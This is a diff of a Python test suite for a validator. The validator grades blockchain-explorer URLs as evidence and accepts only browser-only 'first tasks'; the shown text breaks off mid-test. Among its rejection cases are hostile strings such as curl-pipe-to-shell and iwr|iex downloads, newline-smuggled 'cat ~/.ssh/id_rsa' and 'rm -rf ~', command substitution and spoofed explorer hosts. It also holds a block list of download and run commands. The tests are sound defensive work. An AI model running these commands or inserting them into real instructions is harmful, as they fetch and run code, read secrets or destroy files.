@@ -25,31 +25,36 @@ class EvidenceLadder(unittest.TestCase):
     TX = '0x' + 'a' * 64
     SOL = '5VERv8NMvzbJMEkV8xnrLkEaWRtSz9CosKDYjCJjBRnbJLgp8uirBgmQpjKhoR4tjF3ZpRzrFmBV6UjKdiSZkQUW'
 
-    def test_level_3_public_transactions(self):
-        # concrete public records with a checkable identifier: transaction hash, address or account, token contract, block
+    def test_no_automatic_level_3(self):
+        """Owner decision 2026-10-20: the URL rule never gives level 3. A concrete record on an explorer is level 2 by the rule;
+        its format is what record_url_ok() checks for a curator's level-3 entry."""
         for u in ('https://basescan.org/tx/' + self.TX, 'https://etherscan.io/address/0x' + 'a' * 40, 'https://solscan.io/account/' + self.SOL[:44],
                   'https://explorer.solana.com/tx/' + self.SOL, 'https://optimistic.etherscan.io/tx/' + self.TX,
                   'https://kitescan.ai/tx/' + self.TX,
                   'https://mempool.space/tx/' + 'ab' * 32, 'https://mempool.space/block/840000', 'https://basescan.org/token/0x' + 'e' * 40,
                   'https://www.basescan.org/tx/' + self.TX):
-            self.assertEqual(cv2.source_level(u), 3, u)
+            self.assertEqual(cv2.source_level(u), 2, u)
+            self.assertTrue(cv2.record_url_ok(u), u)
+        self.assertEqual(cv2.claim_level(claim('https://basescan.org/tx/' + TX, kind='economic_flow')), 2)
 
     def test_level_3_needs_https_and_an_exact_explorer_host(self):
         # a host that merely contains "scan" or "explorer" is no explorer; subdomains of a listed explorer are not included
         for u in ('https://evilscan.example/tx/' + self.TX, 'https://x402scan.example/tx/0x' + 'b' * 64,
                   'https://my-explorer.example/address/0x' + 'a' * 40, 'https://basescan.org.evil.example/tx/' + self.TX,
                   'https://evil.basescan.org/tx/' + self.TX, 'https://notbasescan.org/tx/' + self.TX):
-            self.assertLess(cv2.source_level(u), 3, u)
             self.assertEqual(cv2.source_level(u), 1, u)
-        # the same record over http is not level 3
+            self.assertFalse(cv2.record_url_ok(u), u)
+        # the same record over http is no record format
         for u in ('http://basescan.org/tx/' + self.TX, 'http://etherscan.io/address/0x' + 'a' * 40):
-            self.assertLess(cv2.source_level(u), 3, u)
+            self.assertEqual(cv2.source_level(u), 2, u)
+            self.assertFalse(cv2.record_url_ok(u), u)
         self.assertIn('kitescan.ai', cv2.EXPLORER_HOSTS)
         self.assertTrue(all(h == h.lower() and not h.startswith('www.') for h in cv2.EXPLORER_HOSTS))
 
     def test_record_path_is_case_sensitive(self):
         for u in ('https://basescan.org/TX/' + self.TX, 'https://etherscan.io/ADDRESS/0x' + 'a' * 40, 'https://etherscan.io/Address/0x' + 'a' * 40):
-            self.assertEqual(cv2.source_level(u), 2, u)  # an explorer page, but no lowercase record path: aggregate view
+            self.assertEqual(cv2.source_level(u), 2, u)  # an explorer page, but no lowercase record path
+            self.assertFalse(cv2.record_url_ok(u), u)
 
     def test_explorer_aggregates_are_level_2(self):
         # explorer stats, charts and home pages: views over many records, no single record to check
@@ -70,9 +75,9 @@ class EvidenceLadder(unittest.TestCase):
                   'https://example.com/tx/0x' + 'c' * 64):  # a tx-looking path on a host that is no explorer stays text
             self.assertEqual(cv2.source_level(u), 1, u)
 
-    def test_level_3_needs_the_explorers_own_route_and_network_format(self):
-        """Round 8: level 3 only when the whole path is one of the explorer's own record routes (RECORD_ROUTES) with an identifier
-        of that explorer's network; everything else on an explorer is level 2."""
+    def test_record_format_needs_the_explorers_own_route_and_network_format(self):
+        """A curator's level-3 source is one record: the whole path is one of the explorer's own record routes (RECORD_ROUTES) with an
+        identifier of that explorer's network. Every explorer page is level 2 by the URL rule either way."""
         h64 = 'ab' * 32
         good = ('https://etherscan.io/tx/0x' + h64, 'https://mempool.space/tx/' + h64, 'https://explorer.solana.com/tx/' + self.SOL,
                 'https://suiscan.xyz/mainnet/tx/' + self.SOL[:44], 'https://etherscan.io/address/0x' + 'A' * 40,
@@ -84,7 +89,8 @@ class EvidenceLadder(unittest.TestCase):
                 'https://explorer.aptoslabs.com/txn/123456', 'https://explorer.aptoslabs.com/account/0x' + h64,
                 'https://kitescan.ai/address/0x' + 'd' * 40, 'https://etherscan.io/tx/0x' + h64 + '/')
         for u in good:
-            self.assertEqual(cv2.source_level(u), 3, u)
+            self.assertTrue(cv2.record_url_ok(u), u)
+            self.assertEqual(cv2.source_level(u), 2, u)
         bad = (# malformed identifiers (round 7)
                'https://etherscan.io/tx/1', 'https://etherscan.io/tx/0x1', 'https://etherscan.io/tx/0x' + 'a' * 63,
                'https://etherscan.io/tx/0x' + 'a' * 65, 'https://etherscan.io/tx/0x' + 'g' * 64, 'https://etherscan.io/tx/0x' + 'a' * 40,
@@ -108,6 +114,7 @@ class EvidenceLadder(unittest.TestCase):
                'https://oklink.com/eth/tx/0x' + h64, 'https://tronscan.org/address/TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
                'https://explorer.hiro.so/txid/0x' + h64)
         for u in bad:
+            self.assertFalse(cv2.record_url_ok(u), u)
             self.assertEqual(cv2.source_level(u), 2, u)
         # the map is part of the allowlist
         self.assertTrue(set(cv2.RECORD_ROUTES) <= set(cv2.EXPLORER_HOSTS))
@@ -120,7 +127,7 @@ class EvidenceLadder(unittest.TestCase):
     def test_only_money_and_activity_claims(self):
         self.assertIsNone(cv2.claim_level(claim('https://basescan.org/tx/' + TX, kind='description')))
         for k in cv2.EVIDENCE_KINDS:
-            self.assertEqual(cv2.claim_level(claim('https://basescan.org/tx/' + TX, kind=k)), 3)
+            self.assertEqual(cv2.claim_level(claim('https://basescan.org/tx/' + TX, kind=k)), 2)
 
     def test_card_level_is_highest_supported(self):
         c = {'slug': 'x', 'claims': [claim('https://a.example/'), claim('https://api.a.example/v1/stats', kind='economic_flow'),
@@ -132,7 +139,7 @@ class EvidenceLadder(unittest.TestCase):
 
     def test_annotate(self):
         x = cv2.annotate_claim(claim('https://basescan.org/tx/' + TX, kind='economic_flow'))
-        self.assertEqual((x['evidence_level'], x['evidence_label']), (3, 'public transactions'))
+        self.assertEqual((x['evidence_level'], x['evidence_label']), (2, 'public dashboard'))
         self.assertNotIn('evidence_level', cv2.annotate_claim(claim('https://a.example/', kind='description')))
 
 
@@ -181,6 +188,28 @@ class CuratorReview(unittest.TestCase):
         }
         for why, ov in bad.items():
             self.assertTrue(cv2.validate_evidence_overrides(ov, cards), why)
+
+    def test_curator_level_3_format_check(self):
+        rec = 'https://basescan.org/tx/' + TX
+        card = {'slug': 'demo', 'claims': [claim(rec, kind='economic_flow')]}
+        e3 = {'source_url': rec, 'evidence_level': 3, 'evidence_note': 'Curator opened the transaction: a USDC payout.', 'reviewed_on': '2026-10-20'}
+        self.assertEqual(cv2.validate_evidence_overrides({'demo': [e3]}, {'demo': card}), [])
+        ov = cv2.card_overrides(card, {'demo': [e3]})
+        self.assertEqual(cv2.claim_level(card['claims'][0], ov), 3)
+        self.assertEqual(cv2.claim_level(card['claims'][0]), 2)  # without the curator entry: level 2
+        self.assertEqual(cv2.card_evidence(card, {'demo': [e3]})['level'], 3)
+        self.assertEqual(cv2.keys_and_books(card, {}, {'demo': [e3]})['books']['value'], 'public_transactions')
+        self.assertEqual(cv2.annotate_claim(card['claims'][0], ov)['evidence_note'], e3['evidence_note'])
+        # level 3 on anything that is not one explorer record fails, whatever the curator says
+        for bad in ('https://demo.example/payouts', 'https://api.demo.example/v1/payouts', 'https://basescan.org/stats',
+                    'http://basescan.org/tx/' + TX, 'https://evil.com@basescan.org/tx/' + TX, 'https://basescan.org:443/tx/' + TX,
+                    'https://basescan.org/tx/0x1', 'https://basescan.org/tx/' + TX + '?a=1', 'https://basescan.org/en/tx/' + TX,
+                    'https://blockchair.com/bitcoin/transaction/' + 'ab' * 32, 'https://basescan.org/tx/' + TX + '\u200b'):
+            c = {'slug': 'demo', 'claims': [claim(bad, kind='economic_flow')]}
+            errs = cv2.validate_evidence_overrides({'demo': [e3 | {'source_url': bad}]}, {'demo': c})
+            self.assertTrue(any('evidence_level 3 needs one record' in e for e in errs), (bad, errs))
+        # a curator level 2 on an explorer record equals the URL rule now
+        self.assertTrue(cv2.validate_evidence_overrides({'demo': [e3 | {'evidence_level': 2}]}, {'demo': card}))
 
     def test_repo_file_is_valid(self):
         ov = cv2.load_evidence_overrides()
@@ -320,272 +349,88 @@ class KeysAndBooks(unittest.TestCase):
 
 
 class FirstTask(unittest.TestCase):
+    """Owner decision 2026-10-20: a first task has nothing to download or run (one fail-closed rule, task_text_errors)."""
+    FEED = 'https://touchstone.cv/.well-known/touchstone/checkpoints/rec_01m1hbq666jjjyfw7s6tf7h2rd'
+
     def test_repo_file_is_valid_and_only_verified(self):
         tasks = cv2.load_first_tasks()
         self.assertEqual(cv2.validate_first_tasks(tasks, set(CARDS)), [])
         self.assertEqual(set(tasks), {'touchstone'})
-        t = cv2.first_task(CARDS['touchstone'], tasks)
-        self.assertEqual(t['credit'], 'Contributed by reticuli')
-        self.assertIn('SELFTEST OK', ' '.join(t['steps']))
         self.assertIsNone(cv2.first_task(CARDS['dealwork-ai'], tasks))
 
     def test_incomplete_task_fails(self):
         self.assertTrue(cv2.validate_first_tasks({'touchstone': {'title': 't', 'steps': ['a']}}, set(CARDS)))
 
-    TOUCHSTONE_SHA = '8634b6564c8d6404987c5dfb3e380c6b39c6ebc81dcf8ae6224fe0cf3b50ba5f'
-
-    def test_touchstone_checks_the_hash_before_running(self):
+    def test_touchstone_is_the_browser_path(self):
         t = cv2.load_first_tasks()['touchstone']
-        self.assertNotIn('steps', t)  # its steps come from the structured code block
-        self.assertEqual((t['code']['filename'], t['code']['sha256']), ('liveness-verify.py', self.TOUCHSTONE_SHA))
-        self.assertEqual(cv2.code_safety_errors(t), [])
-        steps = cv2.first_task(CARDS['touchstone'], cv2.load_first_tasks())['steps']
-        self.assertIn('sandbox', steps[0].lower())                                      # 1 sandbox
-        self.assertIn('curl -fsSLO https://touchstone.cv/liveness-verify.py', steps[1])  # 2 download
-        self.assertIn(f'`echo "{self.TOUCHSTONE_SHA}  liveness-verify.py" | sha256sum -c -`', steps[2])  # 3 verify
-        self.assertTrue(steps[3].startswith('Run `python3 liveness-verify.py --selftest`'))  # 4 run
-        self.assertIn('rec_01m1hbq666jjjyfw7s6tf7h2rd', steps[4])
-        self.assertEqual(len(steps), 5)
+        self.assertNotIn('code', t)
+        self.assertEqual(cv2.task_text_errors(t), [])
         pub = cv2.first_task(CARDS['touchstone'], cv2.load_first_tasks())
-        self.assertEqual(pub['code'], {'url': 'https://touchstone.cv/liveness-verify.py', 'filename': 'liveness-verify.py',
-                                       'sha256': self.TOUCHSTONE_SHA, 'run': ['python3 liveness-verify.py --selftest',
-                                                                              'python3 liveness-verify.py rec_01m1hbq666jjjyfw7s6tf7h2rd']})
-        self.assertEqual(pub['credit'], 'Contributed by reticuli')
-        self.assertTrue(t.get('no_code'))
+        self.assertNotIn('code', pub)
+        self.assertIn(self.FEED, pub['steps'][0])
+        self.assertIn('browser', pub['steps'][0])
+        self.assertTrue(any('tsa' in x and 'created_at' in x for x in pub['steps']))
+        self.assertIn('which clock each checkpoint', pub['done_when'])
+        self.assertEqual((pub['credit'], pub['contributed_by'], pub['verified_by']), ('Contributed by reticuli', 'reticuli', 'Hark'))
+        self.assertEqual(pub['source_url'], 'https://thecolony.ai/post/2e482bca-592e-4061-afb0-f8b9d7f61f4a')
 
-    def _task(self, **code):
-        sha = 'c' * 64
-        base = {'title': 'Try the tool', 'done_when': 'It prints OK.', 'contributed_by': 'demo', 'contributed_via': 'The Colony',
-                'source_url': 'https://thecolony.ai/post/x', 'verified_by': 'Hark', 'verified_on': '2026-10-19',
-                'verification': f'Script sha256 {sha}; self-test passed.'}
-        c = {'sandbox': 'Work in a clean sandbox without secrets.', 'url': 'https://demo.example/tool.py', 'filename': 'tool.py',
-             'sha256': sha, 'run': [{'cmd': 'python3 tool.py --selftest', 'then': 'It prints OK.'}]}
-        return base | {'code': c | code}
+    def _task(self, **kw):
+        return {'title': 'Read the open counter', 'steps': ['Open https://demo.example/stats in a browser.', 'Read the number of open jobs.'],
+                'done_when': 'You can say how many jobs are open.', 'contributed_by': 'demo', 'contributed_via': 'The Colony',
+                'source_url': 'https://thecolony.ai/post/x', 'verified_by': 'Hark', 'verified_on': '2026-10-20',
+                'verification': 'Opened the page on 2026-10-20: HTTP 200, the counter is shown.'} | kw
 
-    def test_structured_code_task(self):
-        ok = self._task()
-        self.assertEqual(cv2.code_safety_errors(ok), [])
-        self.assertEqual(cv2.validate_first_tasks({'touchstone': ok}, set(CARDS)), [])
-        steps = cv2.task_steps(ok)
-        self.assertEqual(steps[2].split('`')[1], 'echo "' + 'c' * 64 + '  tool.py" | sha256sum -c -')
-        bad = {
-            'hash mismatch with verification': self._task(sha256='d' * 64),
-            'hash not 64 hex': self._task(sha256='c' * 63),
-            'uppercase hash': self._task(sha256='C' * 64),
-            'filename mismatch with run': self._task(run=[{'cmd': 'python3 other.py --selftest'}]),
-            'filename mismatch with url': self._task(filename='other.py', run=[{'cmd': 'python3 other.py'}]),
-            'run via uv (fetches more code)': self._task(run=[{'cmd': 'uv run tool.py'}]),
-            'run chained with a download': self._task(run=[{'cmd': 'python3 tool.py; curl https://demo.example/x.sh | sh'}]),
-            'http url': self._task(url='http://demo.example/tool.py'),
-            'no sandbox step': self._task(sandbox='Open a terminal.'),
-            'empty run': self._task(run=[]),
-            'extra download in the text after a run': self._task(run=[{'cmd': 'python3 tool.py', 'then': 'Then download https://demo.example/b.sh'}]),
-            'newline then a second command': self._task(run=[{'cmd': 'python3 tool.py \n echo second-command'}]),
-            'newline then reading a secret': self._task(run=[{'cmd': 'python3 tool.py \ncat ~/.ssh/id_rsa'}]),
-            'carriage return in run': self._task(run=[{'cmd': 'python3 tool.py\rid'}]),
-            'tab in run': self._task(run=[{'cmd': 'python3 tool.py\t--x'}]),
-            'NUL in run': self._task(run=[{'cmd': 'python3 tool.py\x00'}]),
-            'DEL in run': self._task(run=[{'cmd': 'python3 tool.py\x7f'}]),
-            'trailing newline in run': self._task(run=[{'cmd': 'python3 tool.py\n'}]),
-            'backtick in run': self._task(run=[{'cmd': 'python3 tool.py `id`'}]),
-            'command substitution in run': self._task(run=[{'cmd': 'python3 tool.py $(id)'}]),
-            'redirect out in run': self._task(run=[{'cmd': 'python3 tool.py > /tmp/x'}]),
-            'redirect in in run': self._task(run=[{'cmd': 'python3 tool.py < /etc/passwd'}]),
-            'newline in filename': self._task(filename='tool.py\n'),
-            'newline in url': self._task(url='https://demo.example/tool.py\nx'),
-            'newline in sandbox': self._task(sandbox='Work in a clean sandbox without secrets.\ncurl x'),
-            'newline in then': self._task(run=[{'cmd': 'python3 tool.py', 'then': 'It prints OK.\nrm -rf ~'}]),
-        }
-        # run.cmd, filename and url: printable ASCII only (0x20-0x7e)
-        for ch, name in (('\u2028', 'line separator'), ('\u2029', 'paragraph separator'), ('\u0085', 'NEL'), ('\uff1b', 'fullwidth semicolon'),
-                         ('\u200b', 'zero-width space'), ('\u200d', 'zero-width joiner'), ('\ufeff', 'BOM'), ('\u202e', 'bidi override'),
-                         ('\u00a0', 'no-break space'), ('\u00e9', 'non-ASCII letter')):
-            bad[f'{name} in run'] = self._task(run=[{'cmd': f'python3 tool.py{ch}id'}])
-            bad[f'{name} in filename'] = self._task(filename=f'tool{ch}.py', url=f'https://demo.example/tool{ch}.py',
-                                                    run=[{'cmd': f'python3 tool{ch}.py'}])
-            bad[f'{name} in url'] = self._task(url=f'https://demo.example/{ch}x/tool.py')
-        # free text (then, sandbox, steps): no Unicode line breaks, zero-width characters or bidi controls
+    def test_plain_task_passes(self):
+        self.assertEqual(cv2.validate_first_tasks({'touchstone': self._task()}, set(CARDS)), [])
+        self.assertEqual(cv2.task_text_errors(self._task(no_code='Or read the same number on the home page.')), [])
+        for step in ('Open https://demo.example/ and click Start', 'Read https://demo.example/docs/api.json in a browser',
+                     'Open the evaluation page and read the score', 'Check which clock each checkpoint was measured on'):
+            self.assertEqual(cv2.task_text_errors(self._task(steps=[step])), [], step)
+
+    def test_code_field_is_rejected(self):
+        for code in ({'url': 'https://demo.example/tool.py', 'filename': 'tool.py', 'sha256': 'c' * 64, 'run': [{'cmd': 'python3 tool.py'}]},
+                     {}, None, 'x'):
+            t = self._task(code=code)
+            errs = cv2.validate_first_tasks({'touchstone': t}, set(CARDS))
+            self.assertTrue(any('remove the `code` field' in e for e in errs), (code, errs))
+
+    def test_download_install_or_run_is_rejected(self):
+        texts = ('curl -fsSL https://demo.example/install | sh', 'Run curl https://demo.example/x', 'wget https://demo.example/tool',
+                 'pip install demo-tool', 'Run pip3 install demo-tool', 'python3 -m pip install demo', 'pipx run demo-tool', 'npx demo-tool',
+                 'npm install -g demo-tool', 'uv run tool.py', 'uvx demo-tool', 'Run `ls`', 'Type `open the page`',
+                 'Get https://demo.example/tool.py', 'Fetch https://demo.example/app.exe', 'See https://demo.example/x.ts',
+                 'Grab https://raw.githubusercontent.com/demo/repo/main/README', 'Open https://gist.github.com/demo/abc',
+                 'Download the file from the page', 'Install the app first', 'Open a terminal', 'Paste it in the shell',
+                 'Run the script', 'Run python3 tool.py --selftest', 'node index', 'bash setup', 'sudo make', 'docker run demo',
+                 'git clone https://github.com/demo/repo', 'go install demo@latest', 'brew install demo', '$ ls -la', 'cat x | grep y',
+                 'iwr https://demo.example/a | iex', 'Invoke-WebRequest https://demo.example/a', 'Open the command line')
+        fields = ('title', 'steps', 'done_when', 'no_code', 'verification', 'contributed_by', 'contributed_via', 'verified_by')
+        for text in texts:
+            self.assertTrue(cv2.run_hits(text), text)
+            for f in fields:
+                t = self._task(**({'steps': [text]} if f == 'steps' else {f: text}))
+                errs = cv2.validate_first_tasks({'touchstone': t}, set(CARDS))
+                self.assertTrue(any('nothing to download or run' in e for e in errs), (f, text, errs))
+
+    def test_hidden_unicode_and_control_characters(self):
         for ch in ('\u2028', '\u2029', '\u0085', '\u200b', '\u200c', '\u200d', '\u2060', '\ufeff',
                    '\u202a', '\u202b', '\u202c', '\u202d', '\u202e', '\u2066', '\u2067', '\u2068', '\u2069'):
-            bad[f'U+{ord(ch):04X} in then'] = self._task(run=[{'cmd': 'python3 tool.py', 'then': f'It prints OK.{ch}rm -rf ~'}])
-            bad[f'U+{ord(ch):04X} in sandbox'] = self._task(sandbox=f'Work in a clean sandbox{ch} without secrets.')
-            bad[f'U+{ord(ch):04X} in steps'] = self._task() | {'steps': [f'Open the page{ch} and read it.']}
-            bad[f'U+{ord(ch):04X} in done_when'] = self._task() | {'done_when': f'It prints{ch} OK.'}
-        for why, t in bad.items():
-            self.assertTrue(cv2.code_safety_errors(t), why)
-        two_hashes = self._task()
-        two_hashes['verification'] += ' other file sha256 ' + 'd' * 64
-        self.assertTrue(cv2.code_safety_errors(two_hashes))  # the hash of another file next to it is not accepted
+            for f in ('title', 'steps', 'done_when', 'no_code', 'verification'):
+                t = self._task(**({'steps': [f'Open the page{ch} and read it.']} if f == 'steps' else {f: f'Check the clock{ch}now'}))
+                self.assertTrue(any('Unicode line separators' in e for e in cv2.task_text_errors(t)), (f, repr(ch)))
+        for ch in ('\n', '\r', '\t', '\x00', '\x7f'):
+            self.assertTrue(cv2.task_text_errors(self._task(done_when=f'It shows OK.{ch}x')), repr(ch))
 
     def test_wrong_types_are_errors_not_exceptions(self):
-        cases = {
-            'then is a list': self._task(run=[{'cmd': 'python3 tool.py', 'then': ['unexpected']}]),
-            'then is a number': self._task(run=[{'cmd': 'python3 tool.py', 'then': 1}]),
-            'cmd is a list': self._task(run=[{'cmd': ['python3', 'tool.py']}]),
-            'run is a dict': self._task(run={'cmd': 'python3 tool.py'}),
-            'run item is a string': self._task(run=['python3 tool.py']),
-            'sandbox is a list': self._task(sandbox=['sandbox']),
-            'url is a dict': self._task(url={'u': 'https://demo.example/tool.py'}),
-            'filename is a number': self._task(filename=7),
-            'sha256 is a list': self._task(sha256=['c' * 64]),
-        }
         base = self._task()
-        cases |= {
-            'code is a list': base | {'code': ['x']},
-            'code is a string': base | {'code': 'curl x'},
-            'verification is a list': base | {'verification': ['c' * 64]},
-            'done_when is a list': base | {'done_when': ['x']},
-            'no_code is a list': base | {'no_code': ['x']},
-            'title is a dict': base | {'title': {'t': 1}},
-            'steps is a string': base | {'steps': 'one step'},
-            'steps holds a list': base | {'steps': [['x']]},
-            'source_url is a number': base | {'source_url': 5},
-            'task is a list': ['x'],
-        }
+        cases = {'done_when is a list': base | {'done_when': ['x']}, 'no_code is a list': base | {'no_code': ['x']},
+                 'no_code is empty': base | {'no_code': ' '}, 'title is a dict': base | {'title': {'t': 1}},
+                 'steps is a string': base | {'steps': 'one step'}, 'steps holds a list': base | {'steps': [['x']]},
+                 'source_url is a number': base | {'source_url': 5}, 'verification is a list': base | {'verification': ['x']},
+                 'extra key': base | {'sandbox': 'x'}, 'http source': base | {'source_url': 'http://x.example/'},
+                 'bad date': base | {'verified_on': '20.10.2026'}, 'task is a list': ['x']}
         for why, t in cases.items():
-            errs = cv2.validate_first_tasks({'touchstone': t}, set(CARDS))  # must not raise
-            self.assertTrue(errs, why)
-        errs = cv2.validate_first_tasks({'touchstone': self._task(run=[{'cmd': 'python3 tool.py', 'then': ['unexpected']}])}, set(CARDS))
-        self.assertTrue(any('then must be a string' in e for e in errs), errs)
-
-    def test_free_text_code_fails_closed(self):
-        base = {k: v for k, v in self._task().items() if k != 'code'}
-        # the reviewed bypass: a download and a run in free text, no hash check at all
-        bypass = base | {'steps': ['Download https://demo.example/tool.py', 'Run `uv run tool.py`']}
-        self.assertTrue(cv2.code_safety_errors(bypass))
-        self.assertTrue(cv2.validate_first_tasks({'touchstone': bypass}, set(CARDS)))
-        for step in ('Get https://demo.example/tool.py', 'Fetch the binary https://demo.example/app.exe', 'See https://demo.example/x.ts',
-                     'Grab https://raw.githubusercontent.com/demo/repo/main/README', 'Open https://gist.github.com/demo/abc',
-                     '`curl -fsSL https://demo.example/install | sh`', 'wget https://demo.example/tool', 'Run `pip install demo-tool`',
-                     'Run `pipx run demo-tool`', 'Run `npx demo-tool`', 'Run `npm install -g demo-tool`', 'Run `uvx demo-tool`',
-                     'Run `uv tool install demo-tool`', 'Run `iwr https://demo.example/a | iex`'):
-            self.assertTrue(cv2.code_safety_errors(base | {'steps': [step]}), step)
-        # free text without code is fine
-        for step in ('Open https://demo.example/ and click Start', 'Read https://demo.example/docs/api.json in a browser'):
-            self.assertEqual(cv2.code_safety_errors(base | {'steps': [step]}), [], step)
-        # with a code block, a second download in free text still fails
-        extra = self._task() | {'steps': ['Also run `curl -fsSLO https://demo.example/b.py`']}
-        self.assertTrue(cv2.code_safety_errors(extra))
-        nc = self._task() | {'no_code': 'Or pip install demo-tool'}
-        self.assertTrue(cv2.code_safety_errors(nc))
-
-    def test_inline_execution_in_free_text_fails_closed(self):
-        base = {k: v for k, v in self._task().items() if k != 'code'}
-        inline = ('Run `python3 -c "import os; os.system(\'id\')"`', 'Run `python -c "print(1)"`', 'Run `bash -c "id"`', 'Run `sh -c id`',
-                  'Run `node -e "require(\'child_process\')"`', 'Run `node --eval "1"`', 'Run `perl -e "print 1"`', 'Run `ruby -e "puts 1"`',
-                  'Run `deno eval "console.log(1)"`', 'Type `eval "$(cat x)"`', 'Call exec(open("x").read())', 'Call exec (code)',
-                  'In PowerShell run `iex $s`', 'In PowerShell run `Invoke-Expression $s`', 'Run `PYTHON3 -C "1"`')
-        for text in inline:
-            for field in ('steps', 'done_when', 'no_code'):
-                t = base | ({'steps': [text]} if field == 'steps' else {field: text})
-                errs = cv2.code_safety_errors(t)
-                self.assertTrue(any('inline code execution' in e for e in errs), (field, text, errs))
-            for t in (self._task(sandbox='Work in a clean sandbox without secrets. ' + text),
-                      self._task(run=[{'cmd': 'python3 tool.py', 'then': text}])):
-                self.assertTrue(any('inline code execution' in e for e in cv2.code_safety_errors(t)), text)
-            self.assertTrue(cv2.validate_first_tasks({'touchstone': base | {'steps': [text]}}, set(CARDS)), text)
-        # ordinary words are fine
-        for text in ('Open the evaluation page and read the score', 'The executor prints OK', 'Read the shell section of the docs',
-                     'Check the node list on the page'):
-            self.assertEqual(cv2.code_safety_errors(base | {'steps': [text]}), [], text)
-
-    def test_inline_execution_is_one_structural_rule(self):
-        """Round 5: interpreter or shell (path, env, version, .exe) + whitespace + inline-code flag, in every human-text field."""
-        base = {k: v for k, v in self._task().items() if k != 'code'}
-        inline = ('Run `python3.12 -c "1"`', 'Run `pwsh -c "1"`', 'Run `powershell -Command "1"`', 'Run `/usr/bin/env python3 -c "1"`',
-                  'Run `zsh -c id`', 'Run `python3\t-c "1"`', 'Run `bash  -c id`', 'Run `/usr/bin/python3 -c 1`',
-                  'Run `C:\\Python312\\python.exe -c 1`', 'Run `cmd /c dir`', 'Run `cmd.exe /K dir`', 'Run `php -r "echo 1;"`',
-                  'Run `osascript -e "beep"`', 'Run `Rscript -e 1`', 'Run `lua5.4 -e "print(1)"`', 'Run `bun -e 1`', 'Run `deno eval 1`',
-                  'Run `pwsh -NoProfile -EncodedCommand ZQBjAGgAbwA=`', 'Run `powershell -enc ZQBjAGgAbwA=`', 'Run `nodejs --eval 1`',
-                  'Run `pypy3 -c 1`', 'Run `py -c 1`', 'Run `ksh -c id`', 'Run `fish -c id`', 'Run `dash -c id`', 'Run `tclsh -c 1`',
-                  'Run `perl -E "say 1"`', 'Run `PwSh -COMMAND 1`', 'Run `python3 -u -c 1`', 'Call exec(code)')
-        fields = ('title', 'verification', 'steps', 'done_when', 'no_code', 'contributed_by', 'contributed_via', 'verified_by')
-        for text in inline:
-            for field in fields:
-                t = base | ({'steps': [text]} if field == 'steps' else {field: text})
-                errs = cv2.code_safety_errors(t)
-                self.assertTrue(any('inline code execution' in e for e in errs), (field, text, errs))
-                self.assertTrue(cv2.validate_first_tasks({'touchstone': t}, set(CARDS)), (field, text))
-            for t in (self._task(sandbox='Work in a clean sandbox without secrets. ' + text),
-                      self._task(run=[{'cmd': 'python3 tool.py', 'then': text}])):
-                self.assertTrue(any('inline code execution' in e for e in cv2.code_safety_errors(t)), text)
-        # prose that names a tool, a flag or a word alone is fine
-        for text in ('The executor prints OK', 'Calling exec() is not needed here', 'An exec( ) call is not needed', 'Evaluate the result',
-                     'Python is used for the check', 'The -c flag of the checker is optional', 'Open the evaluation page',
-                     'Check it with sha256sum -c and read the output', 'A bash script is not needed', 'Use the node list',
-                     'Run `python3 tool.py --selftest`', 'Read the cmd output'):
-            for field in fields:
-                t = base | ({'steps': [text]} if field == 'steps' else {field: text})
-                self.assertEqual(cv2.code_safety_errors(t), [], (field, text))
-
-    def test_inline_execution_without_option_parsing(self):
-        """Round 7: an interpreter token and an inline-code flag ANYWHERE in the same field fail, whatever stands between them."""
-        base = {k: v for k, v in self._task().items() if k != 'code'}
-        inline = ('Run `python -W ignore -c "1"`', 'Run `python3 -X dev -W error -c 1`', 'Run `node --input-type module -e "1"`',
-                  'Run `powershell -ExecutionPolicy Bypass -Command "1"`', 'Run `pwsh -NoLogo -NonInteractive -NoProfile -c 1`',
-                  'Run `bash -lc id`', 'Run `sh -ec id`', 'Run `python -cprint(1)`', 'Run `python3 -c"1"`', "Run `php -r'echo 1;'`",
-                  'Run `node -p 1`', 'Run `node --eval=1`', 'Run `perl -pe 1 file`', 'Run `ruby -rjson -e 1`', 'Run `cmd.exe /c dir`',
-                  'Run `python3 - <<EOF` and paste the code', 'Use -c with python3', '-e is the flag; the interpreter is node',
-                  'Run `"/usr/bin/python3" "-c" "1"`', 'Run `env -i python3 -I -c 1`', 'Run `PYTHON3.12.EXE -W ignore -C 1`',
-                  'Run `deno run -A --eval 1`', 'Run `C:\\Python312\\python.exe -B -c 1`')
-        fields = ('title', 'verification', 'steps', 'done_when', 'no_code', 'contributed_by', 'contributed_via', 'verified_by')
-        for text in inline:
-            self.assertTrue(cv2.inline_exec(text), text)
-            for field in fields:
-                t = base | ({'steps': [text]} if field == 'steps' else {field: text})
-                self.assertTrue(any('inline code execution' in e for e in cv2.code_safety_errors(t)), (field, text))
-            for t in (self._task(sandbox='Work in a clean sandbox without secrets. ' + text),
-                      self._task(run=[{'cmd': 'python3 tool.py', 'then': text}])):
-                self.assertTrue(any('inline code execution' in e for e in cv2.code_safety_errors(t)), text)
-        # fail closed by design: prose naming an interpreter and an inline-code flag in one field is rejected too
-        for text in ('The php page shows -c as an option', 'Python is fine; the checker takes -e'):
-            self.assertTrue(cv2.inline_exec(text), text)
-        # a flag without an interpreter, an interpreter without a flag, and look-alike words pass
-        for text in ('Check it with sha256sum -c and read the output', 'Run `python3 tool.py --selftest`', 'Read python.org and node.js docs',
-                     'Open the dashboard', 'The -c flag of the checker is optional', 'Install Python 3 in a fresh venv',
-                     'Run `python3 tool.py rec_01m1hbq666jjjyfw7s6tf7h2rd`', 'Use a .py file', 'Send an e-mail to the cmd-line team'):
-            self.assertFalse(cv2.inline_exec(text), text)
-
-    def test_inline_execution_eval_and_stdin(self):
-        """Round 8: `eval` in any form, and an interpreter token with a pipe, an input redirect or `exec` anywhere, fail."""
-        base = {k: v for k, v in self._task().items() if k != 'code'}
-        inline = ('Call eval("print(1)")', 'Call eval(code)', "Type `eval('1')`", 'Use EVAL(x)', "Run `printf 'puts 1' | ruby`",
-                  'Run `echo 1 | perl`', 'Run `cat x.php | php`', 'Run `echo 1|lua`', 'Run `ruby < script.txt`', 'Run `perl <x`',
-                  'Run `cat x | /usr/bin/env tclsh`', 'Run `Rscript < x.R`', 'Run `osascript < x`', 'Run `echo 1 | deno`',
-                  'Run `python3` then exec the pasted text', 'Pipe the text into node: `| node`')
-        fields = ('title', 'verification', 'steps', 'done_when', 'no_code', 'contributed_by', 'contributed_via', 'verified_by')
-        for text in inline:
-            self.assertTrue(cv2.inline_exec(text), text)
-            for field in fields:
